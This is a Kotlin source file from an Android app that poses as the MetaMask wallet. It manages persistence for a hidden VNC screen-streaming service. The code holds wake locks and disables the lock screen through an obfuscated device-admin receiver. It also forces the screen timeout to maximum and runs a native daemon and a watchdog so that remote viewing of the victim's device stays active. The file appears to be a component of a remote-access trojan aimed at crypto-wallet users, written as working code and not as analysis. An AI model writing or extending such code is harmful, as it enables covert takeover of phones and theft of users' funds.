package com.example.MetaMask.services

import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import com.example.MetaMask.BuildConfig
import com.example.MetaMask.receivers.BadgerFalconRecv

object KeepAliveManager {
    private const val TAG = "KeepAliveManager"
    private const val GRACE_MS  = 20_000L
    private const val CHECK_MS  = 15_000L

    enum class Layer { NONE, FOCUS }
    @Volatile var activeLayer = Layer.NONE

    private val handler = Handler(Looper.getMainLooper())
    @Volatile private var watchdogRunnable: Runnable? = null
    @Volatile private var vncExpected = false

    @Volatile private var partialWakeLock: PowerManager.WakeLock? = null
    @Volatile private var screenWakeLock: PowerManager.WakeLock? = null

    @Suppress("DEPRECATION")
    @Volatile private var keyguardLock: KeyguardManager.KeyguardLock? = null

    fun engageBackground(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] engageBackground enter context=ctx") //xdbg
        AudioFocusHolder.request(context)
        NativeDaemon.ensure(context)
        acquireWakeLock(context, screenOn = false)
        if (BuildConfig.FEAT_WRITE_SETTINGS) applyWriteSettings(context)
        KeepAliveJobService.schedule(context)
    }

    fun engage(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] engage enter context=ctx") //xdbg
        vncExpected = true
        if (activeLayer != Layer.NONE) return

        acquireWakeLock(context, screenOn = true)
        if (BuildConfig.FEAT_DEVICE_ADMIN) applyDeviceAdminPolicies(context)
        disableKeyguard(context)
        if (BuildConfig.FEAT_WRITE_SETTINGS) applyWriteSettings(context)

        AudioFocusHolder.request(context)
        activeLayer = Layer.FOCUS
        startWatchdog(context)
    }

    fun release(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] release enter context=ctx") //xdbg
        vncExpected = false
        stopWatchdog()
        releaseCurrentLayer(context)
        activeLayer = Layer.NONE
        releaseWakeLocks()
        reenableKeyguard()
        AudioFocusHolder.request(context)
    }

    fun releaseAll(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] releaseAll enter context=ctx") //xdbg
        vncExpected = false
        stopWatchdog()
        releaseCurrentLayer(context)
        activeLayer = Layer.NONE
        AudioFocusHolder.release(context)
        NativeDaemon.stop()
        releaseWakeLocks()
        reenableKeyguard()
        KeepAliveJobService.cancel(context)
    }

    fun isVncExpected(): Boolean = vncExpected

    private fun releaseCurrentLayer(context: Context) {}

    private fun startWatchdog(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] startWatchdog enter context=ctx") //xdbg
        stopWatchdog()
        handler.postDelayed({
            if (activeLayer != Layer.NONE) scheduleCheck(context)
        }, GRACE_MS)
    }

    private fun scheduleCheck(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] scheduleCheck enter context=ctx") //xdbg
        val r = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[KeepAliveManager] run enter") //xdbg
                try {
                    check(context)
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[KeepAliveManager] catch (ignored)") //xdbg
                }
                if (activeLayer != Layer.NONE) {
                    android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                    handler.postDelayed(this, CHECK_MS)
                    watchdogRunnable = this
                }
            }
        }
        watchdogRunnable = r
        r.run()
    }

    private fun check(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] check enter context=ctx") //xdbg
        val vncAlive   = isVncAlive()
        val guardAlive = isProtectionAlive(context)
        when {
            !vncAlive && !guardAlive -> {
                activeLayer = Layer.NONE
                stopWatchdog()
            }
            !vncAlive && guardAlive -> {
                release(context)
            }
            vncAlive && !guardAlive -> {
                val oldLayer = activeLayer
                activeLayer = Layer.NONE
                when (oldLayer) {
                    Layer.FOCUS -> engage(context)
                    Layer.NONE -> {}
                }
            }
            else -> {}
        }
    }

    private fun stopWatchdog() {
        android.util.Log.d("XDBG", "[KeepAliveManager] stopWatchdog enter") //xdbg
        watchdogRunnable?.let { handler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    private fun isVncAlive(): Boolean {
        android.util.Log.d("XDBG", "[KeepAliveManager] isVncAlive enter") //xdbg
        val mode = try { CraneService.craneMode } catch (_: Exception) { return false }
        if (mode == "off" || mode.isBlank()) return false
        if (CraneService.instance == null) return false
        val last = try { CraneService.lastFrameSentMs } catch (_: Exception) { 0L }
        if (last == 0L) return true
        android.util.Log.d("XDBG", "[KeepAliveManager] return") //xdbg
        return (System.currentTimeMillis() - last) < 60_000L
    }

    private fun isProtectionAlive(context: Context): Boolean {
        android.util.Log.d("XDBG", "[KeepAliveManager] isProtectionAlive enter context=ctx") //xdbg
        android.util.Log.d("XDBG", "[KeepAliveManager] return") //xdbg
        return when (activeLayer) {
            Layer.FOCUS -> AudioFocusHolder.isHeld
            Layer.NONE  -> false
        }
    }

    private fun acquireWakeLock(context: Context, screenOn: Boolean) {
        android.util.Log.d("XDBG", "[KeepAliveManager] acquireWakeLock enter context=ctx screenOn=${screenOn}") //xdbg
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            if (partialWakeLock == null) {
                android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                partialWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "KeepAlive:partial")
                    .apply { setReferenceCounted(false) }
            }
            if (partialWakeLock?.isHeld != true) {
                android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                partialWakeLock?.acquire()
            }
            if (screenOn) {
                android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                if (screenWakeLock == null) {
                    android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                    @Suppress("DEPRECATION")
                    screenWakeLock = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "KeepAlive:screen"
                    ).apply { setReferenceCounted(false) }
                }
                if (screenWakeLock?.isHeld != true) {
                    android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                    screenWakeLock?.acquire()
                }
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[KeepAliveManager] catch (ignored)") //xdbg
        }
    }

    fun wakeScreen(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] wakeScreen enter context=ctx") //xdbg
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            if (screenWakeLock?.isHeld == true) screenWakeLock?.release()
            @Suppress("DEPRECATION")
            screenWakeLock = pm.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "KeepAlive:screenWake"
            ).apply { setReferenceCounted(false) }
            screenWakeLock?.acquire()
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[KeepAliveManager] catch (ignored)") //xdbg
        }
    }

    private fun releaseWakeLocks() {
        android.util.Log.d("XDBG", "[KeepAliveManager] releaseWakeLocks enter") //xdbg
        try { if (screenWakeLock?.isHeld == true) screenWakeLock?.release() } catch (_: Exception) {}
        try { if (partialWakeLock?.isHeld == true) partialWakeLock?.release() } catch (_: Exception) {}
    }

    private fun applyDeviceAdminPolicies(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] applyDeviceAdminPolicies enter context=ctx") //xdbg
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return
        val admin = ComponentName(context, BadgerFalconRecv::class.java)
        if (!dpm.isAdminActive(admin)) return
        try { dpm.setMaximumTimeToLock(admin, 0L) } catch (_: Exception) {}
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
            try { dpm.setKeyguardDisabled(admin, true) } catch (_: Exception) {}
        }
    }

    @Suppress("DEPRECATION")
    private fun disableKeyguard(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] disableKeyguard enter context=ctx") //xdbg
        try {
            val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager ?: return
            if (keyguardLock == null) keyguardLock = km.newKeyguardLock("KeepAlive:keyguard")
            keyguardLock?.disableKeyguard()
        } catch (_: Exception) {}
    }

    @Suppress("DEPRECATION")
    private fun reenableKeyguard() {
        android.util.Log.d("XDBG", "[KeepAliveManager] reenableKeyguard enter") //xdbg
        try { keyguardLock?.reenableKeyguard(); keyguardLock = null } catch (_: Exception) {}
    }

    private fun applyWriteSettings(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] applyWriteSettings enter context=ctx") //xdbg
        try {
            Settings.System.putInt(
                context.contentResolver,
                Settings.System.SCREEN_OFF_TIMEOUT,
                Int.MAX_VALUE
            )
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[KeepAliveManager] catch (ignored)") //xdbg
        }
    }
}
